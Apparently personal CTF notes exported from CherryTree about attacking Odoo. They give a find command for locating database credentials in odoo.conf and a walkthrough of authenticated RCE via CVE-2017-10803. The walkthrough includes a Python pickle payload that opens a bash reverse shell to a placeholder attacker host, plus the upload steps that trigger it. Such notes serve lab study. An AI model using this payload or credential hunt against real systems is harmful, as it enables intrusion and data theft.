<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Odoo</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Odoo</h1><br/><p><h1>Background</h1></p><p>Odoo is a suite of business management software tools, including a Web App with a built-in Web Server.</p><p></p><p><h2>Configuration Files</h2></p><p>[CTF D 29]</p><p></p><p>You may find SQL connection info (i.e. credentials) in a config file like <strong>/etc/odoo/odoo.conf</strong>.</p><p></p><p><em>find / -iname “*odoo.conf*” 2&gt;/dev/null</em></p><p></p><p><h3>Determine Database</h3></p><p>The name of the SQL DB seems to be the value of <strong>db_template</strong></p><p></p><p><h1>Authenticated RCE</h1></p><p><h2>CVE-2017-10803</h2></p><p>[CTF D 28]</p><p></p><p>In Odoo 8.0, Odoo Community Edition 9.0 and 10.0, and Odoo Enterprise Edition 9.0 and 10.0, insecure handling of anonymization data in the Database Anonymization module allows remote authenticated privileged users to execute arbitrary Python code.</p><p></p><p><h3>Setup</h3></p><p>See <a href="https://www.exploit-db.com/exploits/44064">Exploit-DB</a> 44064. Create the <strong>exploit.pickle</strong> payload file using Python2. You&#39;ll later upload this file to the target. You can switch up the Reverse Shell payload.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: The generated file MUST be named <strong>exploit.pickle</strong>. The Exploit-DB PoC isn&#39;t indented &amp; Python needs proper indentation.</p><p></p><p><em>python2.7</em></p><p></p><p><strong>import cPickle</strong><strong></strong></p><p><strong>import os</strong><strong></strong></p><p><strong>import base64</strong><strong></strong></p><p><strong>import pickletools</strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong>class Exploit(object):</strong><strong></strong></p><p><strong>	def __reduce__(self):</strong><strong></strong></p><p><strong>		return (os.system, ((&quot;bash -i &gt;&amp; /dev/tcp/ATTACKER/PORT 0&gt;&amp;1&quot;),))</strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong>with open(&quot;exploit.pickle&quot;, &quot;wb&quot;) as f:</strong><strong></strong></p><p><strong>	cPickle.dump(Exploit(), f, cPickle.HIGHEST_PROTOCOL)</strong></p><p></p><p><h3>Exploitation</h3></p><p>Sign in as an Admin &amp; click <strong>Apps</strong> (top left).</p><p></p><p>You&#39;ll see a search bar that&#39;s filtering for “Apps” by default. Remove this filter, then search for <strong>Database Anonymization</strong> &amp; <strong>install</strong> it.</p><p></p><p>Click <strong>Settings</strong> (top left) ↓ <strong>Database Anonymization</strong> ↓ <strong>anonymize database</strong></p><p></p><p>That opens a popup where you&#39;ll click <strong>Anonymize Database</strong> (it looks like the title of the popup).</p><p></p><p>Refresh the page (don&#39;t clear the cache with F5) &amp; click <strong>anonymize database</strong> again.</p><p></p><p>Now the popup says &quot;<strong>Reverse the Database Anonymization</strong>&quot; &amp; has the option to upload <strong>Anonymization File</strong> (i.e. <strong>exploit.pickle</strong>).</p><p></p><p>After uploading the file, click <strong>Reverse the Database Anonymization</strong> to trigger the payload.</p></div>
</body>
</html>
